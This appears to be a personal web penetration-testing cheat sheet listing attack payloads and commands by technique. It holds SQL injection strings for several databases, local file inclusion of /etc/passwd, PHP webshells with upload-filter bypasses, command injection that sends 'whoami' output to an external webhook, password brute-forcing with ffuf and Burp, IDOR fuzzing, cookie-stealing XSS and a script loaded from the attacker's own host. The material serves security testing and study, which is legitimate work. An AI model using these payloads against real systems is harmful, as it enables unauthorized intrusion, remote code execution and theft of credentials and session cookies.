
- Identify Vulnerabilities: `whatweb <target>`
- #SQL Injection:
    - Basic Login Bypass
	    - `' AND 1=1#`
	    - `' OR 1=1 --`
	    - `1' or 1=1#`
	    - `1' or 1=1-- -`
	- UNION SELECT
		- `' UNION SELECT null,null FROM users-- -`
	- Detect SQL Vulnerabilities:
```SQL
{payload}--
{payload};--
{payload}#
'||{payload}--
'||{payload}#
"{payload}--
"{payload}#
' AND {payload}--
' OR {payload}--
' AND EXISTS({payload})--
' OR EXISTS({payload})--
```
#MySQL:
```MySQL
' UNION ALL SELECT {payload}--
' UNION SELECT {payload}--
' OR (SELECT {payload}) IS NOT NULL--
' OR (SELECT {payload}) IS NULL--
'||{payload}--
"||{payload}--
'||(SELECT {payload})--
"||(SELECT {payload})--
```
#PostgreSQL :
```PostgreSQL
' UNION ALL SELECT {payload}--
' UNION SELECT {payload}--
' OR (SELECT {payload}) IS NOT NULL--
' OR (SELECT {payload}) IS NULL--
```
#Oracle:
```SQL
' UNION ALL SELECT {payload} FROM dual--
' UNION SELECT {payload} FROM dual--
' OR (SELECT {payload} FROM dual) IS NOT NULL--
' OR (SELECT {payload} FROM dual) IS NULL--
'||({payload})--
'||{payload}||'--
"||{payload}||"--
'||(SELECT {payload} FROM dual)--
```
#MSSQL:
```SQL
' UNION ALL SELECT {payload}--
' UNION SELECT {payload}--
' OR (SELECT {payload}) IS NOT NULL--
' OR (SELECT {payload}) IS NULL--
'+{payload}+
"+{payload}+
'+'+(SELECT {payload})+
"+"+(SELECT {payload})+
```
Other Payloads:
```SQL
OR {payload}=1
AND {payload}=1
AND IF({payload}, SLEEP(5), 1)
AND CASE WHEN {payload} THEN sleep(5) ELSE NULL END
AND {payload}
AND NOT {payload}
AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT('Error:',{payload},0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
```
- Blind SQL example:
```c
' AND SUBSTR((SELECT version()),1,1)='7'#
CAST((SELECT example_column FROM example_table) AS int)
```
- #LFI / #RFI:
    - `curl http://<target>/page.php?file=../../../../etc/passwd`
    - `php://filter/convert.base64-encode/resource=index.php`
- #FileUpload :
    - Rename extensions, bypass MIME-type checks
    - Upload [webshells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) / [revshells](https://www.revshells.com/): `<?php echo shell_exec($_GET['cmd']); ?>`
    - Using Burpsuite repeater:
	    - Upload:`<?php system($_GET['cmd']); ?>
	    - Magic Byte Upload:`<> PNG           IHYskad783 <?php system($_GET['cmd']); ?>`
	    - URL:`http://<ip>/uploads/cmd.php?cmd=whoami`
```
# Bypass extension filters
# Note: req server misconfig to execute or the ability to rename once it's up
shell.php.jpg

# Null byte injection
shell.php%00.jpg

# Blocklist bypass
shell.php5
shell.phtml

# Magic Bytes
head logo.png
<> PNG

```
 - Valid #php file extensions:

| Type       | Extension                                  |     |
| ---------- | ------------------------------------------ | --- |
| php        | phtml, .php, .php3, .php4, .php5, and .inc |     |
| asp        | asp, .aspx                                 |     |
| perl       | .pl, .pm, .cgi, .lib                       |     |
| jsp        | .jsp, .jspx, .jsw, .jsv, and .jspf         |     |
| Coldfusion | .cfm, .cfml, .cfc, .dbm                    |     |
- #CommandInjection :
	- Basic command chaining `; ls -la`
	- Using logic operators `&& ls -la`
	- Commenting out the rest of a command `; ls -la #`
	- Using a pipe for command chaining `| ls -la`
	- Testing for blind injection 
		- `; sleep 10`
		- `; ping -c 10 127.0.0.1`
		- `& whoami > /var/www/html/whoami.txt &`
	- Out-of-band testing `& nslookup webhook.site/<id>?`whoami` &`
- #CMS Exploitation:
    - Exploit misconfigured plugins (e.g., WordPress, Joomla)
    - `wpscan --url <target> --enumerate p`
- #ffuf Bruteforce logins and passwords:
	- Save `POST` request from Burpsuite to .txt
	- change password value to `FUZZ` (for logins, passwords, or both)
		- `ffuf -request req.txt -request-proto http -w /usr/share/seclist/SecLists-Master/Passwords/xato-net-10-million-passwords-10000.txt -fs 1814`
		- `ffuf -request request.txt -request-proto http -mode clusterbomb -w /path/to/users/file.txt:USERFUZZ -w /path/to/password/file.txt:PASSFUZZ -mc 200`
- #Burpesuite BruteForce:
	- Burpsuite > Send to Intruder > Sniper, add payload marker to password, Payload settings load `/usr/share/seclists/SecListsMaster/Passwords/` >Start Attack
	- Look for length changes in results
- #IDOR / #BOLA (insecure object reference):
	- `https://website.com/Tafel.php?id=FUZZ`
	- Can FUZZ validate object references:
		- Create list of numbers 1-100
			- `python3 -c 'for i in range (1,101): print(i)' > ids.txt`
		- Use ffuf to FUZZ the valid ids
			- `ffuf -u 'http://website.com/Tafel.php?id=FUZZ' -w ids.txt | grep FUZZ`
				- Can use `-fs 849` for whatever file size you want to filter out of the results.
- #XSS:
	- Reflected/Stored #XSS payloads:
		- `alert(1)` - popular XSS attack, pops a window in browser
			- may need to test with `print` and `prompt` as `alert` may be filtered out
		- `print()
		- `prompt("hello")`
		- `<script>prompt(1)</script>`
		- `<script>alert(1)</script>`

	- [DOM XSS payloads](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-xss):
		- `<script>prompt(1)</script>`
		- `<img src=x onerror="prompt(1)">`
		- `<img src=x onerror="window.location.href='https://google.com'">`
		- `<script>alert(document.cookie)</script>`
	- Stored #XSS payloads:
		- `<script>prompt(1)</script>)`
		- `<script>alert(document.cookie)</script>`

	- `<script src="http://<our-ip>/script.js"></script>`
- #XXE :
	- Detect & [exploit](https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/XML.txt)
```c
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY xxe "test"> ]>
<foo>
  <bar>&xxe;</bar>
</foo>
```

